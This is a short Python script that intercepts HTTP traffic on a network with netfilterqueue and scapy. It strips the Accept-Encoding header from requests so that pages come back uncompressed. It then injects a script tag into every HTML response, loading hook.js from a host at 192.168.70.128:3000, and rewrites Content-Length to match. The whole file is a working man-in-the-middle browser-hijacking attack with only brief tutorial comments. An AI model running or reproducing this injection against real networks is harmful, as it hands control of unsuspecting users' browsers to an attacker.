import netfilterqueue
import scapy.all as scapy
import re  # is the regex module in py

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        # in the 2arg , replace this pattern with nothing , so the responder will think that we don't understand gzip encoding , so it will send it as plain html
        if scapy_packet[scapy.TCP].dport == 80:
            print("Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "",load )# and the 3arg is the source of this pattern
        elif scapy_packet[scapy.TCP].sport == 80:
            print("Response")
            # print(scapy_packet.show())

            injection_code = '<script src="http://192.168.70.128:3000/hook.js"></script>'
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            load = load.replace("</body>",injection_code + "</body>")
            if content_length_search and "text/html" in load  :
                content_length = content_length_search.group(1)#first match 
                # print(content_length)
                new_contetn_length = int(content_length) + len(injection_code)
                load = load.replace(content_length , str(new_contetn_length))
        if load != scapy_packet[scapy.Raw].load:
            new_packet =  set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
